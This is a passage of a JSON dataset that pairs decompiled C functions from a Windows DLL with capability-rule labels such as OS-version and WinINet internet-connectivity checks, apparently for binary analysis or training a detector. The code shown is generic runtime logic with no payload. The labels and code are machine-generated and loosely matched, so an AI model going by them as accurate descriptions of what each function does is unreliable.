fcn.180003e40(in_stack_00000040);\n            fcn.18008fb00(uStack72 ^ auStack312);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4029
    },
    "18008a5d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * fcn.18008a5d0(ulong arg1, uint *arg2, int64_t *arg3, uint *arg4)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    char *in_stack_00000040;\n    uint uStack88;\n    uint uStack84;\n    int64_t *piStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint auStack56 [4];\n    \n    piVar1 = *(*(in_stack_00000028 + 0x40) + 8);\n    puVar10 = arg2;\n    piStack80 = piVar1;\n    (**0x1800de8f0)(piVar1);\n    iVar7 = fcn.180012470(&uStack88);\n    if (piVar1 != NULL) {\n        puVar10 = *piVar1;\n        iVar8 = (**0x1800de8f0)();\n        if (iVar8 != 0) {\n            puVar10 = NULL;\n            (**0x1800de8f0)();\n        }\n    }\n    cVar5 = *in_stack_00000040;\n    do {\n        if (cVar5 == '\\0') {\ncode_r0x00018008a7f8:\n            cVar5 = fcn.1800738b4(arg3, arg4);\n            if (cVar5 != '\\0') {\n                *in_stack_00000030 = *in_stack_00000030 | 1;\n            }\n            uVar2 = *(arg3 + 4);\n            uVar3 = *(arg3 + 1);\n            uVar4 = *(arg3 + 0xc);\n            *arg2 = *arg3;\n            arg2[1] = uVar2;\n            arg2[2] = uVar3;\n            arg2[3] = uVar4;\n            return arg2;\n        }\n        if (cVar5 == '%') {\n            in_stack_00000040 = in_stack_00000040 + 1;\n            uStack88 = *arg4;\n            uStack84 = arg4[1];\n            piStack80 = *(arg4 + 2);\n            uStack72 = *arg3;\n            uStack68 = *(arg3 + 4);\n            uStack64 = *(arg3 + 1);\n            uStack60 = *(arg3 + 0xc);\n            puVar10 = auStack56;\n            puVar9 = (**0x1800de8f0)();\n            uVar2 = puVar9[1];\n            uVar3 = puVar9[2];\n            uVar4 = puVar9[3];\n            *arg3 = *puVar9;\n            *(arg3 + 4) = uVar2;\n            *(arg3 + 1) = uVar3;\n            *(arg3 + 0xc) = uVar4;\n        }\n        else if (cVar5 == ' ') {\n            while (puVar10 = arg4,  cVar5 = fcn.1800738b4(arg3, arg4),  cVar5 == '\\0') {\n                if (*(arg3 + 1) == '\\0') {\n                    iVar8 = *arg3;\n                    if (iVar8 == 0) {\ncode_r0x00018008a76a:\n                        *arg3 = 0;\n                    }\n                    else {\n                        if (**(iVar8 + 0x38) == NULL) {\n                            puVar10 = NULL;\n                        }\n                        else {\n                            puVar10 = **(iVar8 + 0x50);\n                        }\n                        if (puVar10 < 1) {\n                            uVar6 = (**0x1800de8f0)();\n                        }\n                        else {\n                            uVar6 = ***(iVar8 + 0x38);\n                        }\n                        if (uVar6 == 0xffffffff) goto code_r0x00018008a76a;\n                        *(arg3 + 9) = uVar6;\n                    }\n                    *(arg3 + 1) = 1;\n                }\n                if ((*(*(iVar7 + 0x18) + *(arg3 + 9) * 2) & 0x48) == 0) break;\n                fcn.180071238(arg3);\n            }\n        }\n        else {\n            if (*(arg3 + 1) == '\\0') {\n                iVar8 = *arg3;\n                if (iVar8 == 0) {\ncode_r0x00018008a7bc:\n                    *arg3 = 0;\n                }\n                else {\n                    if (**(iVar8 + 0x38) == NULL) {\n                        puVar10 = NULL;\n                    }\n                    else {\n                        puVar10 = **(iVar8 + 0x50);\n                    }\n                    if (puVar10 < 1) {\n                        uVar6 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar6 = ***(iVar8 + 0x38);\n                    }\n                    if (uVar6 == 0xffffffff) goto code_r0x00018008a7bc;\n                    *(arg3 + 9) = uVar6;\n                }\n                *(arg3 + 1) = 1;\n            }\n            puVar10 = puVar10 & 0xffffffffffffff00 | *(arg3 + 9);\n            cVar5 = (**0x1800de8f0)(iVar7, puVar10, 0);\n            if (cVar5 != *in_stack_00000040) {\n                *in_stack_00000030 = *in_stack_00000030 | 2;\n                goto code_r0x00018008a7f8;\n            }\n            fcn.180071238(arg3);\n        }\n        in_stack_00000040 = in_stack_00000040 + 1;\n        cVar5 = *in_stack_00000040;\n    } while( true );\n}\n",
        "token_count": 1371
    },
    "18008c6d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18008c6d4(ulong noname_0, uint *arg2, uchar (*arg3) [16])\n\n{\n    char cVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    char in_R9B;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t in_stack_00000028;\n    char in_stack_00000038;\n    int64_t *in_stack_00000040;\n    uchar auStack296 [36];\n    char acStack260 [4];\n    uint32_t uStack256;\n    uint32_t uStack252;\n    int64_t *piStack248;\n    uchar (*pauStack240) [16];\n    int64_t iStack232;\n    uint *puStack224;\n    ulong uStack216;\n    uchar auStack200 [8];\n    uint uStack192;\n    uint uStack188;\n    uint64_t uStack176;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    uint64_t uStack152;\n    uint64_t uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    int64_t iStack120;\n    uint64_t uStack112;\n    char cStack104;\n    unkbyte7 Stack103;\n    ulong uStack88;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    \n    uStack216 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack296;\n    iStack232 = in_stack_00000028;\n    piStack248 = in_stack_00000040;\n    iVar6 = *(*(in_stack_00000028 + 0x40) + 8);\n    _auStack200 = CONCAT88(iVar6, auStack200);\n    pauStack240 = arg3;\n    puStack224 = arg2;\n    if (in_R9B == '\\0') {\n        (**0x1800de8f0)(iVar6);\n        uVar5 = fcn.180089b44(auStack200);\n    }\n    else {\n        (**0x1800de8f0)();\n        uVar5 = fcn.180089a10(auStack200);\n    }\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar5);\n    uVar4 = (**0x1800de8f0)(uVar5);\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    uVar11 = uVar4;\n    uStack256 = uVar4;\n    if (in_stack_00000040[2] < uVar11 || in_stack_00000040[2] == uVar11) {\n        fcn.180073990(in_stack_00000040, 0, (uVar11 - in_stack_00000040[2]) + 1);\n    }\n    else {\n        pcVar7 = &cStack104;\n        if (0xf < uStack80) {\n            pcVar7 = CONCAT71(Stack103, cStack104);\n        }\n        if (*pcVar7 != '\\x7f') {\n            pcVar7 = &cStack104;\n            if (0xf < uStack80) {\n                pcVar7 = CONCAT71(Stack103, cStack104);\n            }\n            if ('\\0' < *pcVar7) {\n                (**0x1800de8f0)();\n                pcVar7 = &cStack104;\n                if (0xf < uStack80) {\n                    pcVar7 = CONCAT71(Stack103, cStack104);\n                }\n                uVar12 = in_stack_00000040[2] - uVar11;\n                cVar1 = *pcVar7;\n                uVar4 = uStack256;\n                in_stack_00000028 = iStack232;\n                while (((uStack256 = uVar4,  iStack232 = in_stack_00000028,  cVar1 != '\\x7f' &&\n                        (arg3 = pauStack240,  '\\0' < cVar1)) && (cVar1 < uVar12))) {\n                    uVar12 = uVar12 - cVar1;\n                    fcn.180073990(in_stack_00000040, uVar12, 1);\n                    if ('\\0' < pcVar7[1]) {\n                        pcVar7 = pcVar7 + 1;\n                    }\n                    arg3 = pauStack240;\n                    uVar4 = uStack256;\n                    in_stack_00000028 = iStack232;\n                    cVar1 = *pcVar7;\n                }\n            }\n        }\n    }\n    uStack152 = 0;\n    uStack144 = 0xf;\n    uStack168 = 0;\n    if (in_stack_00000038 == '\\0') {\n        (**0x1800de8f0)(uVar5, acStack260);\n        (**0x1800de8f0)(uVar5, auStack200);\n        fcn.1800113e0(&uStack168, auStack200);\n        if (uStack176 < 0x10) goto code_r0x00018008c9c0;\n        iVar6 = auStack200;\n        if ((uStack176 + 1 < 0x1000) || (iVar6 = *(auStack200 + -8),  (auStack200 - iVar6) - 8U < 0x20))\n        goto code_r0x00018008c9bb;\ncode_r0x00018008cfd9:\n        fcn.1800b3528();\ncode_r0x00018008cfdf:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de8f0)();\n        (**0x1800de8f0)(uVar5, auStack200);\n        fcn.1800113e0(&uStack168, auStack200);\n        if (0xf < uStack176) {\n            iVar6 = auStack200;\n            if ((uStack176 + 1 < 0x1000) || (iVar6 = *(auStack200 + -8),  (auStack200 - iVar6) - 8U < 0x20)) {\ncode_r0x00018008c9bb:\n                fcn.18008fb24(iVar6);\n                goto code_r0x00018008c9c0;\n            }\ncode_r0x00018008cfcd:\n            fcn.1800b3528();\ncode_r0x00018008cfd3:\n            fcn.1800b3528();\n            goto code_r0x00018008cfd9;\n        }\ncode_r0x00018008c9c0:\n        iStack120 = 0;\n        uStack112 = 0xf;\n        uStack136 = 0;\n        if ((*(in_stack_00000028 + 0x18) & 8) != 0) {\n            (**0x1800de8f0)(uVar5, auStack200);\n            fcn.1800113e0(&uStack136, auStack200);\n            if (uStack176 < 0x10) goto code_r0x00018008ca3f;\n            iVar6 = auStack200;\n            if ((uStack176 + 1 < 0x1000) || (iVar6 = *(auStack200 + -8),  (auStack200 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x00018008ca3f;\n            }\n            goto code_r0x00018008cfdf;\n        }\ncode_r0x00018008ca3f:\n        uVar12 = 0;\n        bVar3 = false;\n        uVar10 = uVar12;\n        uVar8 = uVar12;\n        do {\n            cVar1 = acStack260[uVar8];\n            if (cVar1 == ' ') {\n                uVar10 = uVar10 + 1;\ncode_r0x00018008ca8f:\n                if (uVar8 != 3) {\n                    bVar3 = true;\n                }\n            }\n            else if (cVar1 == '$') {\n                uVar10 = uVar10 + iStack120;\n            }\n            else if (cVar1 == '+') {\n                uVar10 = uVar10 + uStack152;\n            }\n            else if (cVar1 == 'v') {\n                iVar6 = uVar11 + 1;\n                if (uVar11 <= in_stack_00000040[2] && in_stack_00000040[2] != uVar11) {\n                    iVar6 = in_stack_00000040[2];\n                }\n                uVar10 = uVar10 + (uVar4 != 0) + iVar6;\n            }\n            else if (cVar1 == 'x') goto code_r0x00018008ca8f;\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 4);\n        uVar11 = *(in_stack_00000028 + 0x28);\n        if ((0 < uVar11) && (uVar10 < uVar11)) {\n            uVar12 = uVar11 - uVar10;\n        }\n        uVar4 = *(in_stack_00000028 + 0x18) & 0x1c0;\n        uStack252 = uVar4;\n        if ((uVar4 != 0x40) && ((uVar4 != 0x100 || (!bVar3)))) {\n            _auStack200 = *arg3;\n            for (; uVar12 != 0; uVar12 = uVar12 - 1) {\n                fcn.18006e7bc(auStack200);\n                in_stack_00000040 = piStack248;\n            }\n            uVar12 = 0;\n            *arg3 = _auStack200;\n        }\n        uVar11 = 0;\n        do {\n            cVar1 = acStack260[uVar11];\n            if (cVar1 == ' ') {\n                _auStack200 = *arg3;\n                fcn.18006e7bc(auStack200);\n                *arg3 = _auStack200;\ncode_r0x00018008cb4c:\n                if (uVar4 != 0x100) goto code_r0x00018008cb8e;\n                _auStack200 = *arg3;\n                for (; uVar12 != 0; uVar12 = uVar12 - 1) {\n                    fcn.18006e7bc(auStack200);\n                    in_stack_00000040 = piStack248;\n                }\n                uVar12 = 0;\ncode_r0x00018008cb89:\n                *arg3 = _auStack200;\n            }\n            else {\n                if (cVar1 == '$') {\n                    _auStack200 = *arg3;\n                    for (iVar6 = iStack120; uVar4 = uStack252,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        fcn.18006e7bc(auStack200);\n                        in_stack_00000040 = piStack248;\n                        arg3 = pauStack240;\n                    }\n                    goto code_r0x00018008cb89;\n                }\n                if (cVar1 == '+') {\n                    if (uStack152 != 0) {\n                        _auStack200 = *arg3;\n                        fcn.18006e7bc(auStack200);\n                        goto code_r0x00018008cb89;\n                    }\n                }\n                else {\n                    if (cVar1 == 'v') {\n                        uVar10 = in_stack_00000040[2];\n                        uVar8 = uStack256;\n                        if (uStack256 == 0) {\n                            _auStack200 = *arg3;\n                            for (; uVar4 = uStack252,  uVar10 != 0; uVar10 = uVar10 - 1) {\n                                fcn.18006e7bc(auStack200);\n                                in_stack_00000040 = piStack248;\n                                arg3 = pauStack240;\n                            }\n                        }\n                        else if (uVar8 < uVar10) {\n                            iVar6 = uVar10 - uVar8;\n                            auStack200._0_4_ = **arg3;\n                            auStack200._4_4_ = *(*arg3 + 4);\n                            uStack192 = *(*arg3 + 8);\n                            uStack188 = *(*arg3 + 0xc);\n                            _auStack200 = *arg3;\n                            if (iVar6 != 0) {\n                                do {\n                                    fcn.18006e7bc(auStack200);\n                                    iVar6 = iVar6 + -1;\n                                } while (iVar6 != 0);\n                                in_stack_00000040 = piStack248;\n                                arg3 = pauStack240;\n                            }\n                            **arg3 = auStack200._0_4_;\n                            *(*arg3 + 4) = auStack200._4_4_;\n                            *(*arg3 + 8) = uStack192;\n                            *(*arg3 + 0xc) = uStack188;\n                            (**0x1800de8f0)(uVar5);\n                            fcn.18006e7bc(arg3);\n                            uVar10 = uStack256;\n                            _auStack200 = *arg3;\n                            uVar4 = uStack252;\n                            if (uStack256 != 0) {\n                                do {\n                                    fcn.18006e7bc(auStack200);\n                                    uVar10 = uVar10 - 1;\n                                    in_stack_00000040 = piStack248;\n                                    arg3 = pauStack240;\n                                    uVar4 = uStack252;\n                                } while (uVar10 != 0);\n                            }\n                        }\n                        else {\n                            fcn.18006e7bc(arg3);\n                            (**0x1800de8f0)(uVar5);\n                            fcn.18006e7bc(arg3);\n                            iVar6 = in_stack_00000040[2];\n                            _auStack200 = *arg3;\n                            iVar9 = uVar8 - iVar6;\n                            in_stack_00000040 = in_stack_00000040;\n                            if (iVar9 != 0) {\n                                do {\n                                    fcn.18006e7bc(auStack200);\n                                    iVar9 = iVar9 + -1;\n                                } while (iVar9 != 0);\n                                iVar6 = piStack248[2];\n                                in_stack_00000040 = piStack248;\n                                arg3 = pauStack240;\n                            }\n                            for (; uVar4 = uStack252,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                                fcn.18006e7bc(auStack200);\n                                in_stack_00000040 = piStack248;\n                                arg3 = pauStack240;\n                            }\n                        }\n                        goto code_r0x00018008cb89;\n                    }\n                    if (cVar1 == 'x') goto code_r0x00018008cb4c;\n                }\n            }\ncode_r0x00018008cb8e:\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 4);\n        if (1 < uStack152) {\n            auStack200._0_4_ = **arg3;\n            auStack200._4_4_ = *(*arg3 + 4);\n            uStack192 = *(*arg3 + 8);\n            uStack188 = *(*arg3 + 0xc);\n            _auStack200 = *arg3;\n            iVar6 = uStack152 - 1;\n            if (iVar6 != 0) {\n                do {\n                    fcn.18006e7bc(auStack200);\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n            }\n            **arg3 = auStack200._0_4_;\n            *(*arg3 + 4) = auStack200._4_4_;\n            *(*arg3 + 8) = uStack192;\n            *(*arg3 + 0xc) = uStack188;\n        }\n        *(iStack232 + 0x28) = 0;\n        auStack200._0_4_ = **arg3;\n        auStack200._4_4_ = *(*arg3 + 4);\n        uStack192 = *(*arg3 + 8);\n        uStack188 = *(*arg3 + 0xc);\n        _auStack200 = *arg3;\n        if (uVar12 != 0) {\n            do {\n                fcn.18006e7bc(auStack200);\n                uVar12 = uVar12 - 1;\n            } while (uVar12 != 0);\n        }\n        *puStack224 = auStack200._0_4_;\n        puStack224[1] = auStack200._4_4_;\n        puStack224[2] = uStack192;\n        puStack224[3] = uStack188;\n        if (uStack112 < 0x10) {\ncode_r0x00018008cec7:\n            iStack120 = 0;\n            uStack112 = 0xf;\n            uStack136 = 0;\n            if (0xf < uStack144) {\n                iVar9 = CONCAT71(Stack167, uStack168);\n                iVar6 = iVar9;\n                if ((0xfff < uStack144 + 1) && (iVar6 = *(iVar9 + -8),  0x1f < (iVar9 - iVar6) - 8U))\n                goto code_r0x00018008cfeb;\n                fcn.18008fb24(iVar6);\n            }\n            uStack152 = 0;\n            uStack144 = 0xf;\n            uStack168 = 0;\n            if (0xf < uStack80) {\n                iVar9 = CONCAT71(Stack103, cStack104);\n                iVar6 = iVar9;\n                if (0xfff < uStack80 + 1) {\n                    iVar6 = *(iVar9 + -8);\n                    if (0x1f < (iVar9 - iVar6) - 8U) {\n                        fcn.1800b3528(iVar6, uStack80 + 0x28);\n                        goto code_r0x00018008cfcd;\n                    }\n                }\n                fcn.18008fb24(iVar6);\n            }\n            uStack88 = *0x180101910;\n            uStack80 = *0x180101918;\n            cStack104 = '\\0';\n            if (in_stack_00000040[3] < 0x10) {\ncode_r0x00018008cf92:\n                in_stack_00000040[2] = 0;\n                in_stack_00000040[3] = 0xf;\n                *in_stack_00000040 = 0;\n                fcn.18008fb00(uStack72 ^ auStack296);\n                return;\n            }\n            iVar6 = *in_stack_00000040;\n            iVar9 = iVar6;\n            if ((in_stack_00000040[3] + 1U < 0x1000) || (iVar9 = *(iVar6 + -8),  (iVar6 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018008cf92;\n            }\n            goto code_r0x00018008cfd3;\n        }\n        iVar9 = CONCAT71(Stack135, uStack136);\n        iVar6 = iVar9;\n        if ((uStack112 + 1 < 0x1000) || (iVar6 = *(iVar9 + -8),  (iVar9 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x00018008cec7;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018008cfeb:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 4514
    },
    "1800949b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800949b8(int64_t arg1, uint *arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint16_t uStackX24;\n    uint8_t uStackX26;\n    uchar auStack40 [32];\n    \n    iVar2 = fcn.180097128();\n    if (3 < iVar2) {\n        fcn.180091b24(&uStackX24);\n        uVar4 = 0;\n        do {\n            puVar3 = uVar4 * 0x40 + *(arg1 + 0x60);\n            if ((*(puVar3 + 2) == uStackX24) && ((*puVar3 & 1 << (uStackX26 & 0x3f)) != 0)) {\n                uVar7 = 0;\n                if (*(puVar3 + 1) != 0) {\n                    do {\n                        if (*(puVar3[6] + 8 + uVar7 * 0x30) == uStackX26) goto code_r0x000180094aaf;\n                        uVar5 = uVar7 + 1;\n                        uVar7 = uVar5;\n                    } while (uVar5 < *(puVar3 + 1));\n                }\n            }\n            uVar4 = uVar4 + 1;\n        } while( true );\n    }\n    if (1 < iVar2 - 2U) {\n        if (*0x1801291b0 == 1) {\n            if (arg2 != NULL) {\n                *arg2 = 0;\n            }\n            return 0;\n        }\n        fcn.1800925d8(auStack40);\n        fcn.1800add8c(auStack40, 0x18011f1f0);\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    uVar5 = fcn.18007539c();\n    uVar4 = 0;\n    do {\n        puVar3 = uVar4 * 0x40 + *(arg1 + 0x60);\n        if ((*puVar3 & 1 << (uVar5 & 0x3f)) != 0) {\n            uVar7 = 0;\n            if (*(puVar3 + 1) != 0) {\n                do {\n                    if (*(puVar3[6] + 8 + uVar7 * 0x30) == uVar5) {\ncode_r0x000180094aaf:\n                        if (arg2 == NULL) {\n                            return uVar4;\n                        }\n                        *arg2 = uVar7;\n                        return uVar4;\n                    }\n                    uVar6 = uVar7 + 1;\n                    uVar7 = uVar6;\n                } while (uVar6 < *(puVar3 + 1));\n            }\n        }\n        uVar4 = uVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 694
    },
    "180095d8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.180095d88(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    double dVar3;\n    bool bVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint32_t uVar8;\n    int64_t *piVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    double dVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint32_t in_stack_00000028;\n    \n    uVar5 = 0;\n    if (1 < *(arg1 + 0xc)) {\n        uVar12 = arg3;\n        uVar14 = 1;\n        piVar7 = *(arg1 + 0x78);\n        uVar18 = *(arg1 + 0xc) - 1;\n        do {\n            uVar16 = uVar18;\n            piVar7 = piVar7 + 1;\n            iVar6 = *(*piVar7 + 0x10);\n            iVar1 = *(iVar6 + 0xe8);\n            uVar11 = *(iVar6 + 0xb4);\n            uVar10 = *(iVar6 + 0xdc) - iVar1;\n            uVar8 = uVar10;\n            if (uVar10 <= uVar11) {\n                uVar8 = uVar11;\n            }\n            uVar13 = *(iVar6 + 0xd0) - *(iVar6 + 0xd8);\n            if (uVar8 + iVar1 < uVar13) {\n                uVar14 = uVar14 + 1;\n                if (uVar10 <= uVar11) {\n                    uVar10 = uVar11;\n                }\n                arg4._0_4_ = arg4 + uVar10 + iVar1;\n                uVar12 = uVar12 + uVar13;\n            }\n            uVar18 = uVar16 - 1;\n        } while (uVar18 != 0);\n        uVar5 = 0;\n        if ((1 < uVar14) && (arg4 <= uVar12)) {\n            uVar18 = uVar14;\n            iVar6 = SUB168(ZEXT416(8) * ZEXT816(uVar18), 0);\n            if (SUB168(ZEXT416(8) * ZEXT816(uVar18) >> 0x40, 0) != 0) {\n                iVar6 = uVar16 - 2;\n            }\n            piVar7 = fcn.18008ff14(iVar6);\n            uVar15 = 1;\n            iVar6 = **(arg1 + 0x78);\n            *piVar7 = iVar6;\n            *(iVar6 + 0x20) = in_stack_00000028;\n            dVar3 = *(*piVar7 + 0x20) + *0x1800e6cf8;\n            uVar5 = SUB84(dVar3, 0);\n            uVar20 = dVar3 >> 0x20;\n            uVar16 = 1;\n            if (1 < *(arg1 + 0xc)) {\n                do {\n                    iVar6 = *(*(*(arg1 + 0x78) + uVar15 * 8) + 0x10);\n                    uVar11 = *(iVar6 + 0xdc) - *(iVar6 + 0xe8);\n                    if (uVar11 <= *(iVar6 + 0xb4)) {\n                        uVar11 = *(iVar6 + 0xb4);\n                    }\n                    uVar17 = uVar16;\n                    if (uVar11 + *(iVar6 + 0xe8) < *(iVar6 + 0xd0) - *(iVar6 + 0xd8)) {\n                        uVar17 = uVar16 + 1;\n                        piVar7[uVar16] = iVar6 + 0x70;\n                        dVar3 = CONCAT44(uVar20, uVar5) + *(iVar6 + 0x90);\n                        uVar5 = SUB84(dVar3, 0);\n                        uVar20 = dVar3 >> 0x20;\n                    }\n                    uVar11 = uVar15 + 1;\n                    uVar15 = uVar11;\n                    uVar16 = uVar17;\n                } while (uVar11 < *(arg1 + 0xc));\n            }\n            uVar23 = SUB84(uVar12, 0);\n            uVar24 = uVar12 >> 0x20;\n            do {\n                do {\n                    do {\n                        dVar3 = CONCAT44(uVar24, uVar23) / CONCAT44(uVar20, uVar5);\n                        uVar21 = SUB84(dVar3, 0);\n                        uVar22 = dVar3 >> 0x20;\n                        piVar9 = piVar7;\n                        uVar12 = uVar18;\n                        do {\n                            iVar6 = *piVar9;\n                            piVar9 = piVar9 + 1;\n                            *(iVar6 + 8) = dVar3 * *(iVar6 + 0x20);\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                        fcn.180096a94(piVar7, uVar14);\n                        bVar4 = false;\n                        uVar12 = uVar14 - 1;\n                        piVar9 = piVar7;\n                        do {\n                            piVar9 = piVar9 + 1;\n                            iVar6 = *piVar9;\n                            uVar11 = *(*(iVar6 + 0x10) + 0xd0) - *(*(iVar6 + 0x10) + 0xd8);\n                            if (uVar11 <= *(iVar6 + 4) && *(iVar6 + 4) != uVar11) {\n                                bVar4 = true;\n                                dVar19 = uVar11 / *(iVar6 + 4);\n                                dVar3 = CONCAT44(uVar20, uVar5) - (*0x1800e6d08 - dVar19) * *(iVar6 + 0x20);\n                                uVar5 = SUB84(dVar3, 0);\n                                uVar20 = dVar3 >> 0x20;\n                                *(iVar6 + 0x20) = *(iVar6 + 0x20) * dVar19;\n                            }\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                        piVar9 = piVar7;\n                        uVar12 = uVar18;\n                    } while (bVar4);\n                    do {\n                        iVar6 = *piVar9;\n                        iVar2 = *(iVar6 + 0x10);\n                        uVar10 = *(iVar2 + 0xe8) + *(iVar2 + 0xb0);\n                        uVar11 = *(iVar2 + 0xec);\n                        uVar8 = uVar11;\n                        if (uVar10 <= uVar11) {\n                            uVar8 = uVar10;\n                        }\n                        if (uVar8 <= *(iVar6 + 4) && *(iVar6 + 4) != uVar8) {\n                            bVar4 = true;\n                            if (uVar10 <= uVar11) {\n                                uVar11 = uVar10;\n                            }\n                            dVar19 = uVar11 / *(iVar6 + 4);\n                            dVar3 = CONCAT44(uVar20, uVar5) - (*0x1800e6d08 - dVar19) * *(iVar6 + 0x20);\n                            uVar5 = SUB84(dVar3, 0);\n                            uVar20 = dVar3 >> 0x20;\n                            *(iVar6 + 0x20) = *(iVar6 + 0x20) * dVar19;\n                        }\n                        uVar12 = uVar12 - 1;\n                        piVar9 = piVar9 + 1;\n                    } while (uVar12 != 0);\n                    piVar9 = piVar7;\n                    uVar12 = uVar18;\n                } while (bVar4);\n                do {\n                    iVar6 = *piVar9;\n                    iVar2 = *(iVar6 + 0x10);\n                    iVar1 = *(iVar2 + 0xe8);\n                    uVar8 = *(iVar2 + 0xdc) - iVar1;\n                    uVar11 = *(iVar2 + 0xb4);\n                    uVar10 = uVar8;\n                    if (uVar8 <= uVar11) {\n                        uVar10 = uVar11;\n                    }\n                    if (*(iVar6 + 4) <= uVar10 + iVar1 && uVar10 + iVar1 != *(iVar6 + 4)) {\n                        bVar4 = true;\n                        if (uVar8 <= uVar11) {\n                            uVar8 = uVar11;\n                        }\n                        dVar19 = (iVar1 + uVar8) / CONCAT44(uVar22, uVar21);\n                        dVar3 = *(iVar6 + 0x20);\n                        *(iVar6 + 0x20) = dVar19;\n                        dVar3 = CONCAT44(uVar20, uVar5) + (dVar19 - dVar3);\n                        uVar5 = SUB84(dVar3, 0);\n                        uVar20 = dVar3 >> 0x20;\n                    }\n                    uVar12 = uVar12 - 1;\n                    piVar9 = piVar9 + 1;\n                } while (uVar12 != 0);\n            } while (bVar4);\n            uVar5 = 0;\n            if (arg3 <= *(*piVar7 + 4) && *(*piVar7 + 4) != arg3) {\n                uVar18 = uVar14 - 1;\n                piVar9 = piVar7;\n                do {\n                    piVar9 = piVar9 + 1;\n                    iVar6 = *(*piVar9 + 0x10);\n                    uVar14 = (*(iVar6 + 0xd0) - *(*piVar9 + 4)) - *(iVar6 + 0xd8);\n                    if (uVar14 != 0) {\n                        fcn.180096358(arg1, arg2, iVar6, uVar14);\n                    }\n                    uVar18 = uVar18 - 1;\n                } while (uVar18 != 0);\n                uVar5 = fcn.18009672c(arg1, arg2, *(*piVar7 + 4) - arg3, 0);\n            }\n            fcn.18008fb24(piVar7);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 2388
    },
    "18009635": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
